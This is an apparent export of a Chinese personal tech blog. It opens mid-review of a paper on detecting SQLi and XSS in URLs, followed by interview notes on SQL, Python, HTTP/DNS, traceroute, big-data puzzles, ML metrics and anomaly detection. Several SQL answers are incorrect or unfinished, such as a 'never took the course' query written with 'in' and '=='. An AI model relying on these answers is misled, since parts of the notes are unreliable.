分析：LTD之所以效率高的多是因为不使用PLN，直接参数个数过多，27.5的Url有13个参数以上，切分参数需要花费大量的时间，在真实流量中，包含参数个数可能更多。另一方面，一些开发者因为某些原因重新模块来隐藏参数，在这种情况下，基于规则的计算需要更加复杂的计算来提取该值。与传统的方法相比，LTD通过限制检测区域来加快计算效率，另一方面也避免了参数重写造成的切割效率问题 2.准确率​ 对照组：典型的char级cnn从原始请求进行分类 ​ 数据集来源： ​ 训练集：真实流量中320w正常流量，80w攻击样本 ​ 测试数据集：10w条不同时间的正常流量数据，在其中选择10000个样本随机将其中一个参数的值替换为SQLi、XSS的攻击载荷，形成恶意样本，其他的为正常样本 ​ 经过实验，明显可以看出，直接的CNN的误报率和漏报率比LTD都要高得多，而这时因为一般payload的长度都很短，而url请求的长度很长。某些已知攻击的payload长度最短可以为6个字符，而这些很短的payload就可以隐藏在很长的背景字符串之中，导致CNN很难学到恶意payload，而LTD中的PLN模块能通过过滤不相关部分来发现隐藏在很长背景字符串中的短payload，因此，LTD可以更准确地区分实际的攻击有效负载和那些恶意的良性URL片段。 Part3 PLN输出可疑区域个数选择​ 分别绘制了xss、sql在1~5个可以区域的ROC、PR曲线，如下： ​ 当区域数为3时，SQLi和XSS均达到了最好或者非常接近最好的准确率。使用更多的区域数能够获得更好的召回率，但是误报率将大大升高。 依然存在的问题​ 1.限定输入长度，对于特长的尾部追加式的攻击依然没有识别能力 ​ 2.单纯的在SQLi和XSS上进行实验，未来还需要文件包含和代码执行等其他攻击类型进行检测 ​ 3.所谓的提升了可解释性我觉得并没有很好地可以追溯源头 【1】Hmm-web: A framework for the detection of attacks against web applications 【2】Xception:Deep learning with depthwise separable convolutions. 【3】Detection of sql injection attacks using hidden markov model. 【4】Character-aware neural language models. 【5】A method for stochastic optimization 【6】 Light-head r-cnn: In defense of two-stage object detector. 【7】Application of the generic feature selection measure in detection of web attacks 【8】Ef-ficient character-level document classification by combining convolution and recurrent layers 貌似]]></content>
      <tags>
        <tag>安全</tag>
        <tag>论文阅读</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python——浅拷贝和深拷贝]]></title>
    <url>%2F2019%2F08%2F25%2Fpython%E2%80%94%E2%80%94%E6%B5%85%E6%8B%B7%E8%B4%9D%E5%92%8C%E6%B7%B1%E6%8B%B7%E8%B4%9D%2F</url>
    <content type="text"><![CDATA[​ 要了解深拷贝和浅拷贝，首先要明确python中的可变类型和不可变类型。 不可变数据类型 Number（数字） String（字符串） Tuple（元组） 可变数据类型 List（列表） Dictionary（字典） Set（集合） 深拷贝和浅拷贝浅拷贝​ 浅拷贝直接 1.对于不可变类型 Number String Tuple,浅复制仅仅是地址指向，不会开辟新空间。 2.对于可变类型 List、Dictionary、Set，浅复制会开辟新的空间地址(仅仅是最顶层开辟了新的空间，里层的元素地址还是一样的)，进行浅拷贝 3.浅拷贝后，改变原始对象中为可变类型的元素的值，会同时影响拷贝对象的；改变原始对象中为不可变类型的元素的值，只有原始类型受影响。 深拷贝 1.除了顶层拷贝，还对子元素也进行了拷贝 2.经过深拷贝后，原始对象和拷贝对象所有的元素地址都没有相同的了]]></content>
      <tags>
        <tag>面试</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sql常见面试题]]></title>
    <url>%2F2019%2F08%2F23%2Fsql%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98%2F</url>
    <content type="text"><![CDATA[1.用一条语句查询出每门课都大于80分的学生姓名 name class Socre 张三 语文 81 张三 数学 75 李四 语文 76 李四 数学 90 王五 语文 81 解法一： 123select distinct name from table where name not in ( select distinct name from table where score&lt;=80) 解法二： 1select name from table groupby name having min(fenshu)&gt;80 2.删除除了自动编号不同外，其他都相同的学生冗余信息 自动编号 学号 姓名 课程编号 课程名称 课程分数 1 2005001 张三 0001 数学 69 2 2005002 李四 0001 数学 80 3 2005001 张三 0001 数学 69 1delete tablename where 自动编号 not in (select min(自动编号) groupby 学号，姓名，课程编号，课程名称，课程分数) 3.有两个表A 和B ，均有key 和value 两个字段，如果B 的key 在A 中也有，就把B 的value 换为A 中对应的value1update b set b.value=(select a.value from a where a.key=b.key) where b.id in (select b.id from b,a where b.key=a.key); 5.查询表A中存在ID重复三次以上的记录1select * from(select count(ID) as count from table group by ID)T where T.count&gt;3 6.取出每个班级成绩前两名的同学，表结构为sno、sname、class、score123select sname,class,score from grade where ( select count(*) from grade as f where f.class==grade.class and f.score&gt;=grade.score) &lt;=2 6.经典的学习成绩问题已知关系模式： ​ s (sno,sname) 学生关系。sno 为学号，sname 为姓名​ c (cno,cname,cteacher) 课程关系cno 为课程号，cname 为课程名，cteacher 为任课教师​ sc(sno,cno,scgrade) 选课关系。scgrade 为成绩 1．找出没有选修过“李明”老师讲授课程的所有学生姓名 1select sname from s where cno in (select cno from c where cteacher==&apos;李明&apos;) 2．列出有二门以上（含两门）不及格课程的学生姓名及其平均成绩 12 3．列出既学过“1”号课程，又学过“2”号课程的所有学生姓名4．列出“1”号课成绩比“2”号同学该门课成绩高的所有学生的学号5．列出“1”号课成绩比“2”号课成绩高的所有学生的学号及其“1”号课和“2”号课的成绩]]></content>
      <tags>
        <tag>面试</tag>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常见map_reduce面试题目]]></title>
    <url>%2F2019%2F08%2F21%2F%E5%B8%B8%E8%A7%81map-reduce%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9B%AE%2F</url>
    <content type="text"><![CDATA[Map reduceMap 阶段 1、先将HDFS中的输入文件file按照一定的标准进行切片 2、调用自己编写的map逻辑，将输入的键值对变成 3、按照一定的规则对输出的键值对进行分区 4、对每个分区中的键值对进行排序。 Reduce 阶段 1、对多个Mapper任务的输出，按照不同的分区，通过网络拷贝到不同的Reducer节点上进行处理，将数据按照分区拷贝到不同的Reducer节点之后，对多个Mapper任务的输出在进行合并，排序。 2、调用自己的reduce逻辑，将键值对变为.在这里注意：每一个键值对都会调用一次reduce函数。 3、将Reducer任务的输出保存到指定的文件中。]]></content>
      <tags>
        <tag>算法</tag>
        <tag>面试</tag>
        <tag>大数据</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python代码效率优化]]></title>
    <url>%2F2019%2F08%2F21%2Fpython%E4%BB%A3%E7%A0%81%E6%95%88%E7%8E%87%E4%BC%98%E5%8C%96%2F</url>
    <content type="text"><![CDATA[​ 最近在面试中遇到问python代码效率优化的问题，感觉答的很混乱，所以想来整理下python代码优化的常见手段。 1.尽量使用python内置函数​ Python 的标准库中有很多内置函数，它们的运行效率都很高。因为很多标准库是使用 C 语言编写的。 2.字符串拼接使用python的标准式​ python字符串的连接方式主要有： 1.使用”+”做字符串拼接 ​ 在 Python 中，字符串变量在内存中是不可变的。如果使用 “+” 拼接字符串，内存会先创建一个新字符串，然后将两个旧字符串拼接，再复制到新字符串。 2.使用%运算符连接 12345&gt; fir = 'hello'&gt; sec = 'monkey'&gt; result = '%s, %s' % (fir, sec)&gt; print(result)&gt; &gt; 3.使用format格式化连接 12345&gt; fir = 'hello'&gt; sec = 'monkey'&gt; result = '&#123;&#125;, &#123;&#125;'.format(fir, sec)&gt; print(result)&gt; &gt; 4.使用join的方式 ​ 这是一种技巧型方法，一般用于连接列表获元组中的字符串。 1234&gt; list = ['1', '2', '3']&gt; result = '+'.join(list)&gt; print(result)&gt; ​ 选用后面三种方式替代”+”字符串拼接 3.需要单次遍历的迭代的数组采用生成器替代​ 生成器拥有惰性计算的特点，并不不会一次性生成全部的值存储在内存中，而是在运行时生成值，因此可以大大节省内存空间。 4.使用while 1代替while True(在python2中)​ 由于Python2中，True/False不是关键字，因此我们可以对其进行任意的赋值，这就导致程序在每次循环时都需要对True/False的值进行检查；而对于1，则被程序进行了优化，而后不会再进行检查。 5.条件语句规范化，使用if x代替if x==True​ x==True会多出一步比较操作]]></content>
      <tags>
        <tag>面试</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[协议线相关常见面试题]]></title>
    <url>%2F2019%2F08%2F20%2F%E5%8D%8F%E8%AE%AE%E7%BA%BF%E7%9B%B8%E5%85%B3%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98%2F</url>
    <content type="text"><![CDATA[HTTP协议HTTP协议组成 请求报文包含三部分： 请求行：包含请求方法、URI、HTTP版本信息 请求首部字段 请求内容实体 post和get区别 区别一： get重点在从服务器上获取资源。 post重点在向服务器发送数据。 区别二： get传输数据是通过URL请求，以field（字段）= value的形式，置于URL后，并用”?”连接，多个请求数据间用”&amp;”连接，如http://127.0.0.1/Test/login.action?name=admin&amp;password=admin，这个过程用户是可见的。 post传输数据通过Http的post机制，将字段与对应值封存在请求实体中发送给服务器，这个过程对用户是不可见的。 区别三： Get传输的数据量小，因为受URL长度限制，但效率较高。 Post可以传输大量数据，所以上传文件时只能用Post方式。 区别四： get是不安全的，因为URL是可见的，可能会泄露私密信息，如密码等。 post较get安全性较高。 区别五： get方式只能支持ASCII字符，向服务器传的中文字符可能会乱码。 post支持标准字符集，可以正确传递中文字符。 为什么说HTTP协议是无状态协议？怎么解决无状态问题 无状态协议对于事务处理没有记忆能力。缺少状态意味着如果后续处理需要前面的信息 解决办法： 1、Cookie 2、通过Session会话保存。 说一下Http协议中302状态(阿里经常问) http协议中，返回状态码302表示重定向。 这种情况下，服务器返回的头部信息中会包含一个 Location 字段，内容是重定向到的url。 在浏览器中输入url后的过程 1.DNS解析：会根据URL逐层查询DNS服务器缓存，直到找到目标IP地址 2.三次握手，TCP连接 3.发送HTTP请求报文 4.返回HTTP响应报文页面 5.根据HTTP页面内容请求页面中的js、xss等，进行页面渲染 6.断开TCP连接，四次挥手 SYN攻击： ​ 在三次握手过程中，服务器发送SYN-ACK之后，收到客户端的ACK之前的TCP连接称为半连接(half-open connect).此时服务器处于Syn_RECV状态.当收到ACK后，服务器转入ESTABLISHED状态.Syn攻击就是 攻击客户端 在短时间内伪造大量不存在的IP地址，向服务器不断地发送syn包，服务器回复确认包，并等待客户的确认，由于源地址是不存在的，服务器需要不断的重发直 至超时，这些伪造的SYN包将长时间占用未连接队列，正常的SYN请求被丢弃，目标系统运行缓慢，严重者引起网络堵塞甚至系统瘫痪。 Cookie和Seesion ​ Cookie是服务器发给浏览器的特殊信息，并会以文本形式存在浏览器中，所以我们点击浏览器的清除记录，往往会问我们是否清理Cookie，当清理之后下次再访问网页就会需要我们重新登录。如果浏览器中存在Cookie，那么提交请求就会一起提交过去服务器在接收到后就会解析Cookie生成与客户端相对应的内容，实现自动登录，Cookie带有我们的比较重要信息，所以一般不要给被人获取 Session是在服务器上保存的信息，当服务器需要为客户创建Session的时候，就会解析客户端请求查看请求是否包含session id，如果包含那么就表明此前已经为客户端创建过session，不包含则创建一个对应的session id，而后回发给客户端，使得客户端下次能带有session id。然后按需保存状态 所以最终的区别总结起来就是：Cookie数据存放在客户浏览器上，Session数据存放在服务器上，Session相对应Cookie安全，而使用Cookie会给服务器减负 什么是HTTPS？和HTTP协议相比优势在哪里？ HTTPS就是HTTP加上加密处理（一般是SSL安全通信线路）+认证+完整性保护 ​ 1.通信内容不加密，内容可能被窃听 ​ 2.不验证通信对方的方式，可能遭到伪装 ​ 3.无法验证报文的完整性，可能被篡改 常见状态码 200 OK 客户端请求成功 400 Bad Request 由于客户端请求有语法错误，不能被服务器所理解。 401 Unauthonzed 请求未经授权。这个状态代码必须和WWW-Authenticate报头域一起使用 403 Forbidden 服务器收到请求，但是拒绝提供服务。服务器通常会在响应正文中给出不提供服务的原因 404 Not Found 请求的资源不存在，例如，输入了错误的URL。 500 Internal Server Error 服务器发生不可预期的错误，导致无法完成客户端的请求。 503 Service Unavailable 服务器当前不能够处理客户端的请求，在一段时间之后，服务器可能会恢复正常 DNS协议DNS协议功能：完成域名-&gt;IP的映射 端口：53 域名解析顺序 1.浏览器内部缓存 ​ 浏览器自身的DNS缓存，缓存时间比较短，大概只有1分钟，且只能容纳1000条缓存 2.Chrome会搜索操作系统自身的DNS缓存 ​ 如果浏览器自身的缓存里面没有找到对应的条目，那么Chrome会搜索操作系统自身的DNS缓存,如果找到且没有过期则停止搜索解析到此结束 3.尝试读取host文件 ​ 如果在Windows系统的DNS缓存也没有找到，那么尝试读取hosts文件， 看看这里面有没有该域名对应的IP地址，如果有则解析成功。 4.先访问系统配置的首选DNS服务器 ​ 浏览器就会发起一个DNS的系统调用，就会向本地配置的首选DNS服务器（一般是电信运营商提供的，也可以使用像Google提供的DNS服务器）发起域名解析请求 5.如果首DNS服务器不能解析,则由首选DNS服务器代替向各个DNS(迭代式) (1)首先访问根域名服务器(DNS服务器内一般都会内置13台根域名服务器的地址)，查询完整域名的ip地址（www.baidu.com），但是根域名会回答不知道完整域名的地址，但知道顶级域名(.com)的ip地址 ​ (2)再去访问对应顶级域名的ip地址，尝试查询完整域名的ip地址，但是顶级域名服务器告诉运营商的DNS我不知道完整域名（www.baidu.com）这个域名的IP地址，但是我知道baidu.com这个域的DNS地址 ​ (3)这样无限迭代，直到查到完整域名的ip地址 DNS劫持 ​ DNS劫持就是通过劫持了DNS服务器，通过某些手段取得某域名的解析记录控制权，进而修改此域名的解析结果，导致对该域名的访问由原IP地址转入到修改后的指定IP，其结果就是对特定的网址不能访问或访问的是假网址，从而实现窃取资料或者破坏原有正常服务的目的。DNS劫持通过篡改DNS服务器上的数据返回给用户一个错误的查询结果来实现的。 解决办法：换用高可信的DNS服务器，比如GoogleDNS 8.8.8.8 DNS污染 ​ DNS污染，指的是用户访问一个地址，国内的服务器(非DNS)监控到用户访问的已经被标记地址时，服务器伪装成DNS服务器向用户发回错误的地址的行为。范例，访问Youtube、Facebook之类网站等出现的状况。 ​ DNS污染症状：目前一些被禁止访问的网站很多就是通过DNS污染来实现的，例如YouTube、Facebook等网站。]]></content>
      <tags>
        <tag>面试</tag>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[面试常见的大数据相关问题]]></title>
    <url>%2F2019%2F08%2F14%2F%E9%9D%A2%E8%AF%95%E5%B8%B8%E8%A7%81%E7%9A%84%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[经典题目1、海量日志数据，提取出某日访问百度次数最多的那个IP。 分析:IP的数目还是有限的，共2^32个，因此可以直接进行hash map 解决方案: ​ 首先是这一天，并且是访问百度的日志中的IP取出来，逐个写入到一个大文件中。注意到IP是32位的，最多有个2^32个IP。同样可以采用映射的方法，比如模1000，把整个大文件映射为1000个小文件，再找出每个小文中出现频率最大的IP（可以采用hash_map进行频率统计，然后再找出频率最大的几个）及相应的频率。然后再在这1000个最大的IP中，找出那个频率最大的IP，即为所求。 2.有一个1G大小的一个文件，里面每一行是一个词，词的大小不超过16字节，内存限制大小是1M。返回频数最高的100个词。 3.有一个1G大小的一个文件，里面每一行是一个词，词的大小不超过16字节，内存限制大小是1M。返回频数最高的100个词。 方案：顺序读文件中，对于每个词x，取hash(x)%5000，然后按照该值存到5000个小文件（记为x0,x1,…x4999）中。这样每个文件大概是200k左右。 如果其中的有的文件超过了1M大小，还可以按照类似的方法继续往下分，直到分解得到的小文件的大小都不超过1M。 对每个小文件，统计每个文件中出现的词以及相应的频率（可以采用trie树/hash_map等），并取出出现频率最大的100个词（可以用含100个结点的最小堆），并把100个词及相应的频率存入文件，这样又得到了5000个文件。下一步就是把这5000个文件进行归并（类似与归并排序）的过程了。 4.给定a、b两个文件，各存放50亿个url，每个url各占64字节，内存限制是4G，让你找出a、b文件共同的url？ 方案1： ​ 可以估计每个文件的大小为5G×64=320G，远远大于内存限制的4G。所以不可能将其完全加载到内存中处理。考虑采取分而治之的方法。 遍历文件a，对每个url求取hash(url)%1000，然后根据所取得的值将url分别存储到1000个小文件（记为a0,a1,…,a999）中。这样每个小文件的大约为300M。 遍历文件b，采取和a相同的方式将url分别存储到1000小文件（记为b0,b1,…,b999）。这样处理后，所有可能相同的url都在对应的小文件（a0vsb0,a1vsb1,…,a999vsb999）中，不对应的小文件不可能有相同的url。然后我们只要求出1000对小文件中相同的url即可。 求每对小文件中相同的url时，可以把其中一个小文件的url存储到hash_set中。然后遍历另一个小文件的每个url，看其是否在刚才构建的hash_set中，如果是，那么就是共同的url，存到文件里面就可以了。 5.在2.5亿个整数中找出不重复的整数，注，内存不足以容纳这2.5亿个整数。 方案1： ​ 采用2-Bitmap（每个数分配2bit，00表示不存在，01表示出现一次，10表示多次，11无意义）进行，共需内存内存，还可以接受。然后扫描这2.5亿个整数，查看Bitmap中相对应位，如果是00变01，01变10，10保持不变。所描完事后，查看bitmap，把对应位是01的整数输出即可。 1.10M内存完成一个100G文件的排序 利用内存和硬盘共同进行排序，每个内存 2.高考满分750，有100w个考生的成绩，求第一百名的成绩（要求最优）。 使用字典，桶排序 海量数据处理题目常用方法1.Hashing​ 适用范围：快速查找，删除的基本数据结构，通常需要总数据量可以放入内存 问题实例： （1).海量日志数据，提取出某日访问百度次数最多的那个IP(经典题目一)。 2.bit-map​ 适用范围：可进行数据的快速查找，判重，删除，一般来说数据范围是int的10倍以下 ​ 基本原理及要点：使用bit数组来表示某些元素是否存在，比如8位电话号码 问题实例： 1)已知某个文件内包含一些电话号码，每个号码为8位数字，统计不同号码的个数。 8位最多99 999 999，大概需要99m个bit，大概10几m字节的内存即可。 2)2.5亿个整数中找出不重复的整数的个数，内存空间不足以容纳这2.5亿个整数。 将bit-map扩展一下，用2bit表示一个数即可，0表示未出现，1表示出现一次，2表示出现2次及以上。或者我们不用2bit来进行表示，我们用两个bit-map即可模拟实现这个2bit-map。 3.堆​ 适用范围：海量数据前n大，并且n比较小，堆可以放入内存 ​ 基本原理及要点：最大堆求前n小，最小堆求前n大。方法，比如求前n小，我们比较当前元素与最大堆里的最大元素，如果它小于最大元素，则应该替换那个最大元素。这样最后得到的n个元素就是最小的n个。适合大数据量，求前n小，n的大小比较小的情况，这样可以扫描一遍即可得到所有的前n元素，效率很高。 问题实例： 1)100w个数中找最大的前100个数。 ​ 用一个100个元素大小的最小堆即可。 4.外排序​ 适用范围：大数据的排序，去重 基本原理及要点：外排序的归并方法，置换选择败者树原理，最优归并树 问题实例 1) 有一个1G大小的一个文件，里面每一行是一个词，词的大小不超过16字节，内存限制大小是1M。返回频数最高的100个词。 分析:因为是计算频数，因此肯定没有办法用位图法，然后考虑是否能用hashing法，内存限制仅为1M，因此也不行，因此考虑外排序法。 方案：顺序读文件中，对于每个词x，取hash(x)%5000，然后按照该值存到5000个小文件（记为x0,x1,…x4999）中。这样每个文件大概是200k左右。 如果其中的有的文件超过了1M大小，还可以按照类似的方法继续往下分，直到分解得到的小文件的大小都不超过1M。 对每个小文件，统计每个文件中出现的词以及相应的频率（可以采用trie树/hash_map等），并取出出现频率最大的100个词（可以用含100个结点的最小堆），并把100个词及相应的频率存入文件，这样又得到了5000个文件。下一步就是把这5000个文件进行归并（类似与归并排序）的过程了。 trie树问题实例： 1).有10个文件，每个文件1G，每个文件的每一行都存放的是用户的query，每个文件的query都可能重复。要你按照query的频度排序。 2).1000万字符串，其中有些是相同的(重复),需要把重复的全部去掉，保留没有重复的字符串。请问怎么设计和实现？ 3).寻找热门查询：查询串的重复度比较高，虽然总数是1千万，但如果除去重复后，不超过3百万个，每个不超过255字节。 第一步、先对这批海量数据预处理，在O（N）的时间内用Hash表完成排序；然后，第二步、借助堆这个数据结构，找出Top K，时间复杂度为N‘logK。 即，借助堆结构，我们可以在log量级的时间内查找和调整/移动。因此，维护一个K(该题目中是10)大小的小根堆，然后遍历300万的Query，分别和根元素进行对比所以，我们最终的时间复杂度是：O（N） + N’*O（logK），（N为1000万，N’为300万]]></content>
      <tags>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[traceroute和ping]]></title>
    <url>%2F2019%2F08%2F08%2Ftraceroute%E5%92%8Cping%2F</url>
    <content type="text"><![CDATA[​ 在日常使用中我们常常会用到ping和traceroute，正好在面试中遇到了这个问题，特来整理一下，下面我们将对这两个协议的具体工作原理进行总结。 Ping​ Ping 是 ICMP 的一个重要应用，主要用来测试两台主机之间的连通性。Ping 的原理是通过向目的主机发送 ICMP Echo 请求报文，目的主机收到之后会发送 Echo 回答报文。Ping 会根据时间和成功响应的次数估算出数据包往返时间以及丢包率。 ping完成的工作流程 构造ICMP数据包—&gt;构造IP数据包—&gt;构造以太网数据帧——物理传输到目标主机——&gt;获取以太网数据帧—&gt;解析出IP数据包—&gt;解析出ICMP数据包—&gt;发送回送应答报文 Traceroute​ Traceroute 是 ICMP 的另一个应用，用来跟踪一个分组从源点到终点的路径。有2种实现方案：基于UDP实现和基于ICMP实现。 基于UDP的实现​ 在基于UDP的实现中，客户端发送的数据包是通过UDP协议来传输的，使用了一个大于30000的端口号，服务器在收到这个数据包的时候会返回一个端口不可达的ICMP错误信息，客户端通过判断收到的错误信息是TTL超时还是端口不可达来判断数据包是否到达目标主机。 源主机向目的主机发送一连串的 IP 数据报（UDP报文）。第一个数据报 P1 的生存时间 TTL 设置为 1，当 P1 到达路径上的第一个路由器 R1 时，R1 收下它并把 TTL 减 1，此时 TTL 等于 0，R1 就把 P1 丢弃，并向源主机发送一个 ICMP 时间超过差错报告报文； 源主机接着发送第二个数据报 P2，并把 TTL 设置为 2。P2 先到达 R1，R1 收下后把 TTL 减 1 再转发给 R2，R2 收下后也把 TTL 减 1，由于此时 TTL 等于 0，R2 就丢弃 P2，并向源主机发送一个 ICMP 时间超过差错报文。 不断执行这样的步骤，直到最后一个数据报刚刚到达目的主机，主机不转发数据报，也不把 TTL 值减 1。但是因为数据报封装的是无法交付的 UDP，因此目的主机要向源主机发送 ICMP 终点不可达差错报告报文。 之后源主机知道了到达目的主机所经过的路由器 IP 地址以及到达每个路由器的往返时间。 如何获得路过的各个路由信息？ 从1开始，每个TTL+1，到每个路由时TTL到0就会回复超时，这样客户端就可以得到每个路过的路由 基于ICMP的实现​ 直接发送一个ICMP回显请求（echo request）数据包，服务器在收到回显请求的时候会向客户端发送一个ICMP回显应答（echo reply）数据包。流程与上面相似，只是最后判断结束上为目标主机（而不是中间经过的主机或路由器）返回一个ICMP回显应答，则结束。]]></content>
      <tags>
        <tag>面试</tag>
        <tag>网络</tag>
        <tag>协议</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[面试前必复习题目]]></title>
    <url>%2F2019%2F08%2F04%2F%E9%9D%A2%E8%AF%95%E5%89%8D%E5%BF%85%E5%A4%8D%E4%B9%A0%E9%A2%98%E7%9B%AE%2F</url>
    <content type="text"><![CDATA[1.二叉树前、中、后、层次非递归写法 2.排序算法(尤其是快排) 3.100000个数中找出最大的k个数 算法： 1.模型的评价指标计算公式 ​ 精确率：判黑真正为黑的占判黑总数的比例 ​ 召回率：正确判黑的占黑样本总数的比例 ​ ROC曲线：在各个阈值下模型以FPR为横坐标、TPR为纵坐标，画的曲线 ​ AUC：ROC曲线线下面积 2.AUC指标详解 计算公式：ROC曲线的线下面积 概率解释：在正负样本中随机取一对正负样本，其中正样本得分大于负样本得分的概率 AUC是否受正负样本比例的影响？ ​ AUC不受正负样本比例的影响，用正负采样过后的测试集和用不进行采样的测试集AUC基本不变 AUC和其他评价指标相比的优势在哪里？为什么？ ​ 改评价指标不受测试集正负样本比例的影响，相比于其他评估指标，例如准确率、召回率和F1值，负样本下采样相当于只将一部分真实的负例排除掉了，然而模型并不能准确地识别出这些负例，所以用下采样后的样本来评估会高估准确率；因为采样只对负样本采样，正样本都在，所以采样对召回率并没什么影响。这两者结合起来，最终导致高估F1值！ 3.word2vec介绍，如何进行训练？有那两种区别是什么？大数据情况下那种更适合？ a.介绍 ​ 一种词向量的表达，能使词的表达具有一定的上下文信息，原始的word2vec是一个浅层神经网络，首先把全部词进行one-hot，那么每个词将对应着一个特征向量， ​ （1）.首先是一个线性的Embedding层。在word2vec进行训练的时候，将输入2k个词的词向量，通过一个共享的D*V（V是词典大小，D是Embebdding的向量维度）的矩阵C，映射为2k个分布式的词向量。C矩阵例存储了要学习的word2cev向量 ​ （2）.忽略上下文的序列信息：输入所有的词向量都汇总到一个Embedding layer(加和取平均) ​ （3）.用softmax进行映射，得到这个词是各个词的概率 ​ （4）.然后根据这个词本身的情况来进行更新 ​ c.有那几种？区别是什么？ ​ Cbow：每次用前后k个词词来预测中间的1个词 词向量更新n词，时间复杂度较低 ​ Skip-gram：用1个词预测前后k个词 词向量更新kn词，时间复杂度较高 更适合数据较少的情况 ​ d.大数据情况下更适合哪种？为什么？ ​ 更适合适用Cbow，因为效率较高 ​ e.有哪几种优化方式？具体讲一下哈弗曼树方式如何进行训练和预测 ​ 分层softmax： ​ 负采样： ​ f.局限性 ​ （1）.只能考虑局部的词之间的关联性 ​ （2）.没有考虑词之间的内在联系 ​ g.实质 ​ 计算输入向量和输出向量的余弦相似度 4.SVM 1.公式推导 2.损失函数 ​ hinge(折页损失函数)+正则 3.映射到的核函数空间有什么要求(核函数要求)？ ​ 过某非线性变换 φ( x) ，将输入空间映射到高维特征空间，在低维输入空间存在某个函数 K(x, x′) ，恰好等于在高维空间中这个内积，即K( x, x′) =&lt;φ( x) ⋅φ( x′) &gt; (这样的函数K被称作核函数) 4.点到向量距离公式推导 5..生成模型和判别模型 1.定义 ​ 生成模型：学习得到数据的联合分布P(x,y)，然后求联合分布。能够学习到数据的生成机制。 ​ 判别模型：学习的到概率的条件分布P(y|x) 2.区别 ​ 数据量和准确率：生成模型的数据量需求比较大，在数据量足够多的时一般生成模型效果较好，因为联合分布能够提供更多的有效信息；而判别模型需要的数据量较小，引起直接面向预测在小数据条件下一般效果比生成模型效果好 ​ 速度：生成模型收敛速度较快 ​ 隐变量情况：生成模型能够应付(高斯混合模型就是生成模型的隐变量形式) 3.常见的生成模型和判别模型 ​ 生成模型：隐马尔科夫链、朴素贝叶斯 ​ 判别模型：csrf 6.xgboost XGBoost的损失函数是什么，节点划分准则是什么？ ​ 损失函数： ​ 节点划分准则： ​ 分类树：信息增益获信息增益比 ​ 回归树：最大均方误差 整体流程： Xgboost和GBDT算法时间复杂度是多少？ ​ 针对每个特征，把属于该节点的训练样本根据该特征值升序排列，通过线性扫描的方式来决定该特征的最佳分裂点，并记录该特征的最大收益（采用最佳分裂点时的收益） ​ 时间复杂度:O(nlogn d m)(n是样本个数，d是特征个数,m是树的深度) xgboost是如何进行剪枝的？ ​ xgboost采用后剪枝的方式进行剪枝，即 从顶到底建立所有可以建立的子树，再从底到顶反向进行剪枝，这样不容易陷入局部最优解。 xgboost和gbdt的区别： ​ 1.xgboost是gbdt的工程化实现 ​ 2.xgboost加入了正则化信息 ​ 3.xgboost允许使用自定义的损失函数 ​ 4.xgboost损失函数加入了二阶导数信息，下降的更快更准 ​ 5.xgboost支持和随机森林一样的列抽样 ​ 6.xgboost支持并行化，但是并不是树与树之间的并行化，而是在最费时的特征排序截断进行并行化，将排序结果进行分桶保存，各个树生成时复用 ​ 7.xgboost基模型除了支持gbdt支持的CART树外还支持其他的基模型 7.样本不平衡问题处理办法8.L1正则化和L2正则化极大似然和最大熵]]></content>
      <tags>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[异常检测]]></title>
    <url>%2F2019%2F08%2F01%2F%E5%BC%82%E5%B8%B8%E6%A3%80%E6%B5%8B%2F</url>
    <content type="text"><![CDATA[​ 异常检测，是指在大量正常的行为中找出少量的异常行为。 常见异常检测方式1.分位点法​ 超过四分位点之外的数据可以认为是异常数据 2.Z-score(高斯分布)​ 使用情况：一维或低维空间的异常检测算法 该技术是假定数据时高斯分布，异常值是分布尾部的数据点，因此原理数据的平均值 3.孤立森林略 python实现： 1234567from sklearn.ensemble import IsolationForestimport pandas as pdclf = IsolationForest(max_samples=100, random_state=42)table = pd.concat([input_table['Mean(ArrDelay)']], axis=1)clf.fit(table)output_table = pd.DataFrame(clf.predict(table)) 4.聚类​ 最常采用的方式就是聚类的方式，根据不同聚类算法的特点，使用各种聚类算法时也有不同的方法和应用场景，下面来具体介绍一下我对聚类在异常检测中的常见做法 Kmeans​ 注意：Kmeans法做异常检测注意一定要做归一化 使用方法一 ​ 聚类完成后，使用距离中心点最远的第n个点到中心点的距离为阈值，大于阈值则为异常点 使用方法二 ​ 使用历史的全部数据进行聚类，使用这个聚类模型可以将数据中离质心最远的点找出来，将这个点到质心的距离设置为阈值，当有新数据进来时，判断这个数据到其质心的距离是否大于阈值，超过这个阈值则认为是异常。 ​ 问题：历史数据并非全部为正常数据，也包含了异常数据 ​ 解决 : 可以先将各个类中距离最远的那部分数据进行人工查看，确定不存在异常 DBSAN​ 直接对数据进行聚类，将不属于任意一类的样本作为异常样本]]></content>
      <tags>
        <tag>算法</tag>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[UEBA]]></title>
    <url>%2F2019%2F08%2F01%2FUEBA%2F</url>
